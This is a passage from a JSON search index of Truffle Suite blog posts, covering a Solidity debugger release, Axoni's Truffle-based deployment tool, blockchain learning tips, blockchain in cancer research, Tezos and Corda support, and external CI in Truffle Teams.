"text": "If you've followed Truffle development, you're familiar with the truffle debug command. This was the first incarnation of a \"debugger\" built into Truffle, though it wasn't much more than a code tracer. Our new debugger comes with everything you expect : Code stepping (over, into, out, next, instruction, etc.) Current code location, including the address of the running contract Breakpoints Watch expressions Variable inspection (stack, memory and storage) Custom expression evaluation using Solidity variables On top of that, our new debugger is fully portable, built to integrate with any Javascript project or editor, like Visual Studio Code. Lastly, we built it to work with any Ethereum client , so you could debug transactions against the main Ethereum network if you so desired.", "title": "What We've Built"}, {"location": "blog/announcing-full-portable-solidity-debugger/#how-it-works", "text": "To debug your Solidity code, you first need to make a transaction. Ethereum is a world computer with a history of all execution, so we can pull all the information we need from past transactions. After obtaining the transaction hash, simply run the following to kick off your debugging experience: $ truffle debug <tx hash> This will open up the debugging console which you can use to your heart's content! The above user interface gives you access to the debugger features you need to step through your contracts' code, set breakpoints, evaluate expressions and inspect Solidity variables, providing you a better sense of what your code is doing. Under the hood, our debugger is interacting with your Ethereum client to gather all the data necessary to provide this information to you in a suitable manner. For developers reading this, the debugging library stores all this data in Redux, making the data easy to manage and making the library super portable. Most of the work done by the debugger results in some type of mapping. The debugger gathers tons of disparate data, like the bytecode of your contracts, abstract representations of your code, instructions run during your transaction, etc., and combines them to produce information useful to the contract developer. Perhaps the debugger's most valuable property is variable inspection: Using all the data gathered, the debugger can determine which variables exist within your contract, which apply to each section of the code, and what their values are at any point in time. It can even show the values of complex data types, like structs with nested arrays. We're still filling out a few data types, but expect those in the next couple weeks. If you plan on using the debug command today , we recommend using Using Truffle Develop and the Console . Truffle Develop comes with everything you need \"baked in\" to fully debug your contracts. Ganache and ganache-cli will need to be updated, so stay tuned for that in the coming days.", "title": "How it Works"}, {"location": "blog/announcing-full-portable-solidity-debugger/#where-to-next", "text": "The debugger we built unlocks tons of value for all Ethereum developers both new and advanced, but what you're seeing here is the tip of the iceberg of where this technology will go. The interface above is just one interface, meant to show off the debugger's capability. As mentioned, the libraries we built are super portable, so they'll end up making their way into all of the following: Integrated Development Environments (IDEs) like Visual Studio Code Ganache , including a full debugging UI Drizzle , for automatic variable change detection after a transaction Browser plugins so you can debug transactions on the fly within your application Ethereum provider libraries that let you debug your code anywhere, without a plugin We encourage the Ethereum community to help build these tools. Our code is open source, and you can find all of it on Github .", "title": "Where to Next"}, {"location": "blog/announcing-full-portable-solidity-debugger/#how-to-get-it", "text": "If you already have Truffle installed, simply run the following to get you to the latest version: $ npm uninstall -g truffle $ npm install -g truffle If you're new to Truffle, you can try it out using: $ npm install -g truffle You may have to use sudo with the above commands if you're running Linux. More information about how to use Truffle can be found in our documentation , and feel free to reach out on our community GitHub Discussions channel , where hundreds of your fellow Trufflers congregate to answer your question.", "title": "How to Get It"}, {"location": "blog/announcing-full-portable-solidity-debugger/#a-quick-thank-you", "text": "I'd like to personally thank the whole Truffle team for this effort, and particularly Nick D'Andrea for turning some initial research work into a fully portable, fully featured debugger. The engineering under the hood is amazing, I urge you to take a look . I'd also like to thank the community at large: It's a pleasure building the tools that make your lives easier, and your consistent feedback makes the whole endeavor worthwhile. Thanks, -- Tim", "title": "A Quick Thank You"}, {"location": "blog/axonis-enterprise-use-of-truffle/", "text": "Axoni Background \u00b6 At Axoni, our mission is to make shared information more trusted and reliable. We do this through distributed technology that we call \"Ethereum-inspired\", which has both a broad and a specific meaning. In the broad sense, the core technology plays a role for its users analogous to the public blockchain, presenting a powerful and extensible capacity to side-step undesired intermediaries (yes, these exist for banks too...). In a more precise technical sense, our platform borrows certain concepts from Ethereum (e.g. accounts, contracts, gas...) and, importantly, we make efforts to comply with Ethereum-world interfaces (e.g. evm bytecode, web3 JSON-rpc). Of course, an up-shot of the last is the ability to take part in all the innovation taking place in the broader Ethereum ecosystem, including client-side libraries that enable a \"tastier\" application development process. To this end, within the last year we have worked to leverage the Truffle suite and ecosystem to great effect. In fact, as reported , it is fair to say that Truffle serves by and large as the main toolset for on-chain application development at Axoni. Using Truffle at Axoni \u00b6 It was a delight for us to find that, given our compliance with the web3 JSON-RPC spec, truffle basically works \"out-of-the-box\" with no extensive customization required for many very useful stages in the application lifecycle: develop, build, test.... One notable exception: we found the native truffle migrate functionality not extensible to our use case. In part, this is due to the fact that our smart contract applications implement something similar to the proxy pattern , which runs counter to the \"migration\" paradigm. On the other hand, and for reasons beyond the scope of this post, tools such as zoslib designed to handle upgradeable smart contract application deployments, generate smart contract implementations incompatible with our use case. At a high level, our smart contract framework is optimized for high-throughput and highly complex Solidity applications which enables the ability to make automatic upgrades based on semantic versioning. [ Note: I plan to speak more about our particular use cases and smart contract topologies at Trufflecon on August 3rd] In any case, especially due to the often very high levels of complexity entailed by our use cases\u2013 combined with the noted application-level gotcha's of upgrade design patterns in solidity itself \u2013we are biased towards a simple and opinionated declarative format that application and production engineers can easily understand and (when needed) manipulate. This raises the question -- why use truffle for this? It seems there are at least three reasons: truffle-config.js / truffle.js serves as an already existing central source of shared information about various network providers relevant for a particular application developer. It only makes sense to extend this format for use in production-like environments as well. Truffle code artifacts, a battle-tested standard for smart contracts and solidity code, in particular, provide a common interface for a toolchain. By virtue of using truffle, there is no need to re-create this format. For a non-development deployment, a contracts_build_directory parameter is supplied, which results in a pull from a remote artifacts repository. Obviously @truffle/contract itself provides a nice object oriented interface for deploying and performing operations on contracts within this script, thus avoiding any reinventing the wheel within the deployment library itself. Thus, we ventured to build a package on top of truffle that manages configuration-driven smart contract deployments and upgrades. Building a Truffle-Based Deployment Tool \u00b6 The first question is what the configuration file should look like? We determined the \"Straw Man\" to be, simply, a two-dimensional list of job types and associated contracts specified for deployment. Starting with this, we found another concept we needed to add (\"custom-partition\") that is specific to Axcore, relating to the way the node software provisions data across network partitions; certain contracts are provisioned differently from others. In addition to this, we found that the only other concept we needed was a parameter specifying dependencies (\"deps\") that linearizes to a certain order to deployment (which may be necessary, for instance, if a given storage address stores reference to another). For concision, we added limited regex support. In the end, we arrived at a yaml-based file looking very much like the below: version : 0.0.1 setup : partitions : - custom-partition : * - custom-partition : ^public-common contracts : - name : MagmaRegistryFooStorage - name : MagmaRegistryBarStorage deps : - MagmaRegistryFooStorage upgrade : partitions : - custom-partition : \"*\" contracts : - name : MagmaRegistryFoo - name : MagmaRegistryBar In terms of implementation, a truffle exec script reads this configuration file, and for each contract, a) deploys the contract b) performs some basic API configuration and c) installs it in the application through invoking a basic initialization method. The basic top-level run (truffle exec) script looks very much like the below: const run = async ( done ) => { let jobParams = args ; // Configure specific variables for a PROD-like environment: if ( process . env . ENV === 'PROD' ) { jobParams = Object . assign ( args , handleProd ()); } //hoisting injected vars to global scope: global . web3 = web3 ; global . artifacts = artifacts ; // Create instance of job based on type const jobInstance = new Job ( jobParams . job , jobParams ); //Run job by deploying and invoking an initialization method on each contract await jobInstance . run (). catch ( e => done ( e )); done (); }; A command-line client can specify a given job to run, such as the \"upgrade\" job specified above. Given the above configuration, the below command would deploy (if necessary) and initialize \"MagmaRegistryFooStorage\", followed by \"MagmaRegistryBarStorage\" from a given artifacts repository: etna --job upgrade --contracts_build_directory /path/to/artifacts Future Plans and an Announcement \u00b6 I am pleased to announce that we plan to open-source our core Solidity smart contract library, which provides an alternative version of the Proxy pattern, along with this aforementioned deployment tool. We believe both could be useful both for private and public applications and the Axoni team is excited to see what the community builds with these tools. In the meantime, we hope the above at least provides a high-level example of an approach to building lightweight extensions within truffle, and as a simplifying approach to the smart contract deployment process, especially for Proxy Pattern topologies. The Axoni team and I look forward to discussing this topic and much more (such as Axlang, our Scala-based Solidity-alternative ) at Trufflecon.", "title": "Axoni's Enterprise Use of Truffle"}, {"location": "blog/axonis-enterprise-use-of-truffle/#axoni-background", "text": "At Axoni, our mission is to make shared information more trusted and reliable. We do this through distributed technology that we call \"Ethereum-inspired\", which has both a broad and a specific meaning. In the broad sense, the core technology plays a role for its users analogous to the public blockchain, presenting a powerful and extensible capacity to side-step undesired intermediaries (yes, these exist for banks too...). In a more precise technical sense, our platform borrows certain concepts from Ethereum (e.g. accounts, contracts, gas...) and, importantly, we make efforts to comply with Ethereum-world interfaces (e.g. evm bytecode, web3 JSON-rpc). Of course, an up-shot of the last is the ability to take part in all the innovation taking place in the broader Ethereum ecosystem, including client-side libraries that enable a \"tastier\" application development process. To this end, within the last year we have worked to leverage the Truffle suite and ecosystem to great effect. In fact, as reported , it is fair to say that Truffle serves by and large as the main toolset for on-chain application development at Axoni.", "title": "Axoni Background"}, {"location": "blog/axonis-enterprise-use-of-truffle/#using-truffle-at-axoni", "text": "It was a delight for us to find that, given our compliance with the web3 JSON-RPC spec, truffle basically works \"out-of-the-box\" with no extensive customization required for many very useful stages in the application lifecycle: develop, build, test.... One notable exception: we found the native truffle migrate functionality not extensible to our use case. In part, this is due to the fact that our smart contract applications implement something similar to the proxy pattern , which runs counter to the \"migration\" paradigm. On the other hand, and for reasons beyond the scope of this post, tools such as zoslib designed to handle upgradeable smart contract application deployments, generate smart contract implementations incompatible with our use case. At a high level, our smart contract framework is optimized for high-throughput and highly complex Solidity applications which enables the ability to make automatic upgrades based on semantic versioning. [ Note: I plan to speak more about our particular use cases and smart contract topologies at Trufflecon on August 3rd] In any case, especially due to the often very high levels of complexity entailed by our use cases\u2013 combined with the noted application-level gotcha's of upgrade design patterns in solidity itself \u2013we are biased towards a simple and opinionated declarative format that application and production engineers can easily understand and (when needed) manipulate. This raises the question -- why use truffle for this? It seems there are at least three reasons: truffle-config.js / truffle.js serves as an already existing central source of shared information about various network providers relevant for a particular application developer. It only makes sense to extend this format for use in production-like environments as well. Truffle code artifacts, a battle-tested standard for smart contracts and solidity code, in particular, provide a common interface for a toolchain. By virtue of using truffle, there is no need to re-create this format. For a non-development deployment, a contracts_build_directory parameter is supplied, which results in a pull from a remote artifacts repository. Obviously @truffle/contract itself provides a nice object oriented interface for deploying and performing operations on contracts within this script, thus avoiding any reinventing the wheel within the deployment library itself. Thus, we ventured to build a package on top of truffle that manages configuration-driven smart contract deployments and upgrades.", "title": "Using Truffle at Axoni"}, {"location": "blog/axonis-enterprise-use-of-truffle/#building-a-truffle-based-deployment-tool", "text": "The first question is what the configuration file should look like? We determined the \"Straw Man\" to be, simply, a two-dimensional list of job types and associated contracts specified for deployment. Starting with this, we found another concept we needed to add (\"custom-partition\") that is specific to Axcore, relating to the way the node software provisions data across network partitions; certain contracts are provisioned differently from others. In addition to this, we found that the only other concept we needed was a parameter specifying dependencies (\"deps\") that linearizes to a certain order to deployment (which may be necessary, for instance, if a given storage address stores reference to another). For concision, we added limited regex support. In the end, we arrived at a yaml-based file looking very much like the below: version : 0.0.1 setup : partitions : - custom-partition : * - custom-partition : ^public-common contracts : - name : MagmaRegistryFooStorage - name : MagmaRegistryBarStorage deps : - MagmaRegistryFooStorage upgrade : partitions : - custom-partition : \"*\" contracts : - name : MagmaRegistryFoo - name : MagmaRegistryBar In terms of implementation, a truffle exec script reads this configuration file, and for each contract, a) deploys the contract b) performs some basic API configuration and c) installs it in the application through invoking a basic initialization method. The basic top-level run (truffle exec) script looks very much like the below: const run = async ( done ) => { let jobParams = args ; // Configure specific variables for a PROD-like environment: if ( process . env . ENV === 'PROD' ) { jobParams = Object . assign ( args , handleProd ()); } //hoisting injected vars to global scope: global . web3 = web3 ; global . artifacts = artifacts ; // Create instance of job based on type const jobInstance = new Job ( jobParams . job , jobParams ); //Run job by deploying and invoking an initialization method on each contract await jobInstance . run (). catch ( e => done ( e )); done (); }; A command-line client can specify a given job to run, such as the \"upgrade\" job specified above. Given the above configuration, the below command would deploy (if necessary) and initialize \"MagmaRegistryFooStorage\", followed by \"MagmaRegistryBarStorage\" from a given artifacts repository: etna --job upgrade --contracts_build_directory /path/to/artifacts", "title": "Building a Truffle-Based Deployment Tool"}, {"location": "blog/axonis-enterprise-use-of-truffle/#future-plans-and-an-announcement", "text": "I am pleased to announce that we plan to open-source our core Solidity smart contract library, which provides an alternative version of the Proxy pattern, along with this aforementioned deployment tool. We believe both could be useful both for private and public applications and the Axoni team is excited to see what the community builds with these tools. In the meantime, we hope the above at least provides a high-level example of an approach to building lightweight extensions within truffle, and as a simplifying approach to the smart contract deployment process, especially for Proxy Pattern topologies. The Axoni team and I look forward to discussing this topic and much more (such as Axlang, our Scala-based Solidity-alternative ) at Trufflecon.", "title": "Future Plans and an Announcement"}, {"location": "blog/best-methods-to-understand-blockchain-if-youre-not-a-developer/", "text": "As a non-technical person, it feels like it takes 1.21 gigawatts to keep up with the speed of technology - even Doc Brown himself couldn't have predicted all of the technological advancements with his flux capacitor. Not only are we trying to keep up with technologies like blockchain, machine learning, and AI, but we have an overwhelming amount of information on the web all at the click of a mouse. It's overwhelming to the point that it's difficult to even know where to begin. However, online blockchain educational materials have started to ramp up. As I write this, I'm confident I'll start seeing \u201c Blockchain for dummies\u201d online course advertisements on my browser (Opt-in, of course, because I'm using Brave). Mind-blowing! Let me help you begin by slowing down in order to speed up effectively. So you're someone who's not technical that wants to learn blockchain - great! Whether you're technical or non-technical isn't necessarily contingent on understanding an emerging technology like blockchain. Rather it's how you position yourself in the marketplace where you'll start to see the fruits of your labor. Human to human chit chatting \u00b6 First things first, human to human interaction is where you want to start and it's awesome! Yes, YouTube will always be there for you - or at least until your battery dies, but dialoguing with another person and in this case, someone well-versed in blockchain will lay a strong foundation to springboard yourself into understanding this industry. I hate to use the phrase \u201ctrust me,\u201d but trust me, as someone who's not that technical and has a background in Kinesiology, I can assure you that learning from the great minds of my Truffle developers has helped me grasp the concepts of blockchain technology. I'll say, most folks that are experts in their field generally have no problem chatting with a hungry and curious mind. If anything, it's flattering when I get approached to explain blockchain to someone who desires to understand it. We're gifted with the ability to use analogies and other practical ways of explanations that can make light of things that often feel dark and hard to see. Check out this great analogy on sharding ! Guess what? Developers don't mind talking to non-technical people who are trying to understand a particular technology like blockchain. It's a ridiculous stereotype to think devs only like to chat with other devs. If that were the case, how could a business be run successfully? In fact, oftentimes the best explanations come from the top experts. Developers don't like jargon or complexity either. We even gave the term developer operations a cute little nickname like DevOps. Seek out the developer in the blockchain space and ask away...better yet, reach out to one of us at Truffle\u2013we love our community! Meet-ups \u00b6 Go to your local blockchain meetups. There's probably more than a few that are available for you to attend. Meetups can be two-fold, namely, one to obtain knowledge and the other for networking, which can sometimes lead to a job. I can't tell you how many times I've hired someone that I initially met at a meetup. It sure beats throwing your resume on a job board hoping that it will stick. Relationships become the most valuable asset you can have to aid in your next employment opportunity. Moreover, everyone at a meetup shares one common trait. A passion for blockchain. Social Media \u00b6 Maybe you're a little shy and don't want to network (although I highly recommend it!). There's a myriad of resources available online to learn the underpinnings of blockchain technology. You can visit our Truffle University page for more information taking our courses. If you like to learn through watching other people's conversations, Twitter is the place to go . You can make your way over to Quora if you have specific questions about blockchain. Don't want people to know who you are, Reddit has phenomenal ELI5 (explain it like I'm 5) explanations. Read a Book \u00b6 Some people enjoy a nice old fashion book. By far the best book to understand blockchain is Mastering Bitcoin and Mastering Ethereum by Andreas Antonopoulos. Podcast \u00b6 Listening to a Podcast is great. Especially when you're on the go. It's a way to redeem your commute to work, get through a workout session, or just something to pass the time. Often times, podcast hosts will have guest in the blockchain space to give an objective perspective on what the challenges and successes are with the technology. ![TruffleCon](/img/blog/best-methods-to-understand-blockchain-if-youre-not-a-developer/trufflecon.png) Finally, and I may be a little bias, but if you really want to increase the pace at which you can comprehend blockchain then go to TruffleCon! Come say hi to all of us at Truffle. Come say hello to all of the speakers and blockchain company representatives. Ask us questions. Let us help you understand blockchain better. Let's network. Let's have a relationship that will enable amicability. Or better yet, let's interop with each other to leverage the power of blockchain for careers, security, and better transparency in an ever-growing technological world, one node at a time.", "title": "The Best Methods to Understand Blockchain Technology if You\u2019re Not A Developer"}, {"location": "blog/best-methods-to-understand-blockchain-if-youre-not-a-developer/#human-to-human-chit-chatting", "text": "First things first, human to human interaction is where you want to start and it's awesome! Yes, YouTube will always be there for you - or at least until your battery dies, but dialoguing with another person and in this case, someone well-versed in blockchain will lay a strong foundation to springboard yourself into understanding this industry. I hate to use the phrase \u201ctrust me,\u201d but trust me, as someone who's not that technical and has a background in Kinesiology, I can assure you that learning from the great minds of my Truffle developers has helped me grasp the concepts of blockchain technology. I'll say, most folks that are experts in their field generally have no problem chatting with a hungry and curious mind. If anything, it's flattering when I get approached to explain blockchain to someone who desires to understand it. We're gifted with the ability to use analogies and other practical ways of explanations that can make light of things that often feel dark and hard to see. Check out this great analogy on sharding ! Guess what? Developers don't mind talking to non-technical people who are trying to understand a particular technology like blockchain. It's a ridiculous stereotype to think devs only like to chat with other devs. If that were the case, how could a business be run successfully? In fact, oftentimes the best explanations come from the top experts. Developers don't like jargon or complexity either. We even gave the term developer operations a cute little nickname like DevOps. Seek out the developer in the blockchain space and ask away...better yet, reach out to one of us at Truffle\u2013we love our community!", "title": "Human to human chit chatting"}, {"location": "blog/best-methods-to-understand-blockchain-if-youre-not-a-developer/#meet-ups", "text": "Go to your local blockchain meetups. There's probably more than a few that are available for you to attend. Meetups can be two-fold, namely, one to obtain knowledge and the other for networking, which can sometimes lead to a job. I can't tell you how many times I've hired someone that I initially met at a meetup. It sure beats throwing your resume on a job board hoping that it will stick. Relationships become the most valuable asset you can have to aid in your next employment opportunity. Moreover, everyone at a meetup shares one common trait. A passion for blockchain.", "title": "Meet-ups"}, {"location": "blog/best-methods-to-understand-blockchain-if-youre-not-a-developer/#social-media", "text": "Maybe you're a little shy and don't want to network (although I highly recommend it!). There's a myriad of resources available online to learn the underpinnings of blockchain technology. You can visit our Truffle University page for more information taking our courses. If you like to learn through watching other people's conversations, Twitter is the place to go . You can make your way over to Quora if you have specific questions about blockchain. Don't want people to know who you are, Reddit has phenomenal ELI5 (explain it like I'm 5) explanations.", "title": "Social Media"}, {"location": "blog/best-methods-to-understand-blockchain-if-youre-not-a-developer/#read-a-book", "text": "Some people enjoy a nice old fashion book. By far the best book to understand blockchain is Mastering Bitcoin and Mastering Ethereum by Andreas Antonopoulos.", "title": "Read a Book"}, {"location": "blog/best-methods-to-understand-blockchain-if-youre-not-a-developer/#podcast", "text": "Listening to a Podcast is great. Especially when you're on the go. It's a way to redeem your commute to work, get through a workout session, or just something to pass the time. Often times, podcast hosts will have guest in the blockchain space to give an objective perspective on what the challenges and successes are with the technology.", "title": "Podcast"}, {"location": "blog/blockchain-will-cure-cancer/", "text": "Physicians and scientists will be the actual agents behind a cure for cancer. But in their potential to disrupt the very nature of medical research and treatment, blockchain-based solutions are extremely likely to light the way. It is important when examining any new technology to consider the ways in which it may change the world. Join me here as we briefly look at how blockchain can help lead us to a world without cancer. Cancer is a significant public health issue in the United States and around the world. In the United States alone, an estimated 1.7 million new cancer cases were diagnosed in 2018. This number is expected to increase drastically as time goes on. Several barriers exist to finding a cure for cancer. Key among them are data challenges, difficulty quickly assessing the effectiveness of new treatments, and the financing required to fund research and treatment. Fortunately, blockchain technology is already providing avenues for addressing these barriers and bringing us closer to a cure for cancer. It\u2019s in the Data \u00b6 At its core, the path to curing cancer lies in accessing and evaluating as much data about the disease as possible. Blockchain solutions for medical data are already being proposed and tested . The primary benefits of using blockchain technology for storing and processing medical data lie in the portability and patient ownership of that data. On their own, these benefits are as helpful to cancer patients as they are to other medical patients. The particular usefulness of blockchain for cancer data lies in the ability of patients to volunteer their medical records to be used in research. This data will need to be anonymized and, of course, regulatory hurdles are likely to exist, but aggregating medical data from potentially millions of patients around the world will allow physicians and researchers access to unprecedented levels of information about the disease they seek to cure. BreastWeCan.org is one fledgling organization seeking to increase the base of data upon which further cancer research can be built. By encouraging women to upload their mammogram scans and other breast cancer images onto a blockchain, the company hopes to allow an AI to then study these images and share what it learns. Better knowledge sharing means more effective treatments \u00b6 Information about cancer treatment and the results thereof is essential to finding a cure. From clinical trials to variation in responses to existing treatments among patients, information is the key. Blockchain technology can help in this respect by encouraging patients to share their treatment experiences and encouraging physicians to collaborate in their treatment attempts. One U.S. company has piloted a blockchain-based system for evaluating patient responses to cancer treatment. Encouraging patients and oncologists to provide information with an \u201cOnco\u201d coin, OncoPower will allow oncologists access to \u201cde-identified \u2026 details like co-morbidity, specific cancer type, lines of therapy, and actual drugs used for treatment.\u201d OncoPower\u2019s promise lies in the ability to anonymize medical data, put it on a blockchain, and make it accessible to the medical community. This will encourage collaboration and knowledge-sharing amongst health care practitioners and researchers, increasing the visibility of various health outcomes and leading to faster iteration when it comes to experimental treatments. Another exciting treatment approach by Hypertrust Patient Data Care in Germany focuses on the immutable and verifiable aspects of blockchain to ensure that the supply chain for very sensitive immunotherapy treatments can be made as reliable as possible. Hypertrust tracks medication from \u201cneedle to needle\u201d and leverages the transparency of a blockchain to improve patient outcomes. Targeted Financing \u00b6 One thing that blockchain technology does incredibly well is to provide opportunities for decentralized governance and transparency. In the case of financing cancer research, blockchain could prove to be the silver bullet needed to ensure that funding goes where it will be most useful. While it does not appear that cancer fundraising has made its way onto a blockchain just yet, the ability of donors to contribute to cancer research in a tangible and trackable way is likely to increase donations and empower engagement within the scientific community. Putting cancer funding on a blockchain and encouraging the scientific community to engage in that blockchain\u2019s governance could provide a catalyst for encouraging efficient, transparent, and collaborative research efforts. Looking Ahead \u00b6 Blockchain technology is still in early stages, and it may be too soon to know precisely in which ways it may change our world. Developments in the medical applications of blockchain technology are very encouraging. Cancer has evaded a cure for many years, and the advent of new ways for scientists and physicians to learn, collaborate, and experiment may be just what the medical community needs.", "title": "Blockchain Will Cure Cancer"}, {"location": "blog/blockchain-will-cure-cancer/#its-in-the-data", "text": "At its core, the path to curing cancer lies in accessing and evaluating as much data about the disease as possible. Blockchain solutions for medical data are already being proposed and tested . The primary benefits of using blockchain technology for storing and processing medical data lie in the portability and patient ownership of that data. On their own, these benefits are as helpful to cancer patients as they are to other medical patients. The particular usefulness of blockchain for cancer data lies in the ability of patients to volunteer their medical records to be used in research. This data will need to be anonymized and, of course, regulatory hurdles are likely to exist, but aggregating medical data from potentially millions of patients around the world will allow physicians and researchers access to unprecedented levels of information about the disease they seek to cure. BreastWeCan.org is one fledgling organization seeking to increase the base of data upon which further cancer research can be built. By encouraging women to upload their mammogram scans and other breast cancer images onto a blockchain, the company hopes to allow an AI to then study these images and share what it learns.", "title": "It\u2019s in the Data"}, {"location": "blog/blockchain-will-cure-cancer/#better-knowledge-sharing-means-more-effective-treatments", "text": "Information about cancer treatment and the results thereof is essential to finding a cure. From clinical trials to variation in responses to existing treatments among patients, information is the key. Blockchain technology can help in this respect by encouraging patients to share their treatment experiences and encouraging physicians to collaborate in their treatment attempts. One U.S. company has piloted a blockchain-based system for evaluating patient responses to cancer treatment. Encouraging patients and oncologists to provide information with an \u201cOnco\u201d coin, OncoPower will allow oncologists access to \u201cde-identified \u2026 details like co-morbidity, specific cancer type, lines of therapy, and actual drugs used for treatment.\u201d OncoPower\u2019s promise lies in the ability to anonymize medical data, put it on a blockchain, and make it accessible to the medical community. This will encourage collaboration and knowledge-sharing amongst health care practitioners and researchers, increasing the visibility of various health outcomes and leading to faster iteration when it comes to experimental treatments. Another exciting treatment approach by Hypertrust Patient Data Care in Germany focuses on the immutable and verifiable aspects of blockchain to ensure that the supply chain for very sensitive immunotherapy treatments can be made as reliable as possible. Hypertrust tracks medication from \u201cneedle to needle\u201d and leverages the transparency of a blockchain to improve patient outcomes.", "title": "Better knowledge sharing means more effective treatments"}, {"location": "blog/blockchain-will-cure-cancer/#targeted-financing", "text": "One thing that blockchain technology does incredibly well is to provide opportunities for decentralized governance and transparency. In the case of financing cancer research, blockchain could prove to be the silver bullet needed to ensure that funding goes where it will be most useful. While it does not appear that cancer fundraising has made its way onto a blockchain just yet, the ability of donors to contribute to cancer research in a tangible and trackable way is likely to increase donations and empower engagement within the scientific community. Putting cancer funding on a blockchain and encouraging the scientific community to engage in that blockchain\u2019s governance could provide a catalyst for encouraging efficient, transparent, and collaborative research efforts.", "title": "Targeted Financing"}, {"location": "blog/blockchain-will-cure-cancer/#looking-ahead", "text": "Blockchain technology is still in early stages, and it may be too soon to know precisely in which ways it may change our world. Developments in the medical applications of blockchain technology are very encouraging. Cancer has evaded a cure for many years, and the advent of new ways for scientists and physicians to learn, collaborate, and experiment may be just what the medical community needs.", "title": "Looking Ahead"}, {"location": "blog/branching-out-announcing-tezos-support-in-truffle/", "text": "If you've been following Truffle's development, you'll notice that our tools already support a handful of exciting platforms: Ethereum , Quorum , Axoni , Hyperledger Fabric-EVM , Hyperledger Sawtooth , and Hyperledger Burrow . What's common amongst these chains is that they all use the Ethereum Virtual Machine under the hood. Ethereum is very near and dear to our hearts -- it's where we got our start, and where we are the most competent. But we're branching out, in large part due to market demand. In December we released a beta Corda-flavored Ganache as part of our initial support for the Corda platform . And today, we branch out even further. Important The Corda flavor is deprecated and has been removed from Ganache UI in v2.7.0. See the release notes for details. I'm excited to announce Tezos integration into the Truffle command line tool. Right now, at this very moment, you can download a Tezos-specific version of Truffle and start building smart contracts on Tezos networks using the time-tested tooling you know and love. And if you're a Tezos native who got your start building on top of the Tezos platform, then this means professional-grade tooling has finally arrived. We chose Tezos as our first non-EVM chain because of its blossoming developer community. In our position as tool builders, we go where the market takes us: If enough people ask for Tezos support, we listen. This market demand was coupled with an active and interested group of core developers, and a blockchain architecture that's similar to Ethereum. Ultimately, Tezos is \"EVM-like\". This makes it a great candidate for integration, fitting into Truffle like a glove. Are you a developer who wants to build on top of Tezos using Truffle? Check out our documentation and our quick start guide . It's important to note that our integration with Tezos is experimental. As of now you'll need to download a special version of Truffle to start building on Tezos. This is by design: Integrating a new blockchain into a common workflow takes some work, and we want to ensure we keep the same level of quality for our existing chains while we work out the kinks. You can be extremely helpful here! If you run into an issue using the Tezos version of Truffle, let us know! You can file an issue at our issue tracker . Our plan over the coming months is to harden our Tezos integration and ultimately release it under the mainline version of Truffle. We\u2019ve also expanded our commitment to the Tezos project by finalizing plans for further integrations: 1) a Tezos-flavored Ganache ; and 2) full support for the SmartPy programming language. Though this is our first foray into supporting non-EVM blockchains, I'd like to take this moment to reaffirm our support and interest in Ethereum and Ethereum-based blockchains. You'll see many more announcements in 2020 about how we're planning to make development on both Ethereum 1.0 and Ethereum 2.0 better. Stay tuned. I'd like to thank some standout developers in the Tezos community for making this integration a reality. First, are the developers from Stove Labs , Matej \u0160ima & Istvan Deak. They helped significantly in stress testing our integration and providing continuous feedback during development. I'd also like to thank Taquito developers Jev Bj\u00f6rsell and Simon B.Robert for creating an easy to use library for communicating with and interacting with the Tezos blockchain (for Ethereum developers, this is the Web3.js equivalent). Last but not least, a big shout out to the developers of the LIGO programming language, Gabriel Alfour and the rest of the LIGO development team, for making LIGO compiler integration easy on us. Cheers to you! We're excited to announce Tezos support as one of many integrations to come in 2020. Thank you for your continued support of our work, and the opportunity to make your development life easier. Happy coding! Tim -- Founder & CEO, Truffle Suite", "title": "Branching Out - Announcing Tezos Support in Truffle"}, {"location": "blog/branching-out-phase-2-of-corda-flavored-ganache/", "text": "Important The Corda flavor is deprecated and has been removed from Ganache UI in v2.7.0. See the release notes for details. April has been a big month for Truffle Suite! Earlier this month we branched out and announced Tezos integration into the Truffle command line tool. If you remember, back in December we released a beta Corda-flavored Ganache as part of our initial support for the Corda platform. Today, we are excited to share Phase 2 of Corda-flavored Ganache, v2.4.0 with you! Phase 2 includes more robust features for Corda including Corda CRaSH Shell, network map visualization, and a version picker. We're thrilled to release Phase 2 of Ganache for Corda, an open source blockchain platform built for business applications, as this continues to lower the barrier to entry for Corda developers. These updates enable developers to easily set up a local network on their machines, letting them inspect the state of that network across various nodes and giving them visibility into transactions normally hidden by a live Corda network's privacy protections. Features Include: One-click Corda network configuration and initialization, so you can focus on what matters most: your application. Multiple workspaces for all of your Corda projects including a Corda network map, notaries, nodes, transactions, accounts, and ledgers. Simple testing for interoperability with the Version Picker node. Easy access to all your application's data, including network map, notaries, nodes, transactions, and states. Visualizations of node connections with the Corda network map graph Embedded Corda CRaSH Shell to provide control over your nodes and project data As always, this release is compatible with the latest versions of Windows \u229e, Mac OS \ud83c\udf4e, and Linux \ud83d\udc27. You can now run and interact with a Corda network without installing prerequisites like Java, PostgreSQL, Corda binaries, docker, etc! If you are a Corda developer who wants to use Ganache with your CorDapp check out our documentation and our quick start guide . We are also hosting a joint webinar with R3 on May 6th to demonstrate these features along with how this fits into existing Corda developer\u2019s\u2019 workflow. In closing, I\u2019d like to thank our partners at R3, Todd McDonald, Lisa Chiong, Tiffany Sarmiento, Chris Chabot, and Nick Rogers for their collaboration, vision, and teamwork. I\u2019d also like to thank David Murdoch and Nick Paterno from the Truffle team for their tireless efforts to make Corda Flavored Ganache a reality. Thank you for your continued support and the opportunity to make your development life easier. Happy coding! Tim -- Founder & CEO, Truffle Suite", "title": "Branching Out - Phase 2 of Corda-flavored Ganache"}, {"location": "blog/bring-your-own-ci-byoci-with-truffle-teams/", "text": "Truffle Teams has always offered an internal continuous integration (CI) service. This service is great for getting up and running quickly since it requires no configuration to run your Truffle tests. We also want to support teams who have established CI setups outside of Truffle Teams. Thanks to the fantastic work by Erin Shaben , you can now leverage your existing GitHub-integrated build services ! Using an Existing CI Service \u00b6 The BUILDS settings screen Enabling external CI for a repository only requires a single checkbox! Navigate to your user or organization\u2019s settings page by clicking the user/org icon in the navbar. From there, click the BUILDS tab, then check the checkbox next to the repository of your choice! Build with external CI enabled Now, when you navigate to the builds page for that repository, any new builds will show a list of your GitHub-integrated build services, along with their respective statuses. For more detailed information on the external CI service, check out our documentation here . For more detailed information on adding services to GitHub via their Marketplace, check out the GitHub Marketplace docs here . Future Integration \u00b6 We want Truffle Teams to be the most effective devops tool in the blockchain space for both new and existing teams. Let us know what you think about this integration solution, and if your team has other needs we haven\u2019t met yet. Thanks! Josh Quintal -- Head of Product & Marketing, Truffle Suite", "title": "Bring Your Own CI (BYOCI) with Truffle Teams"}, 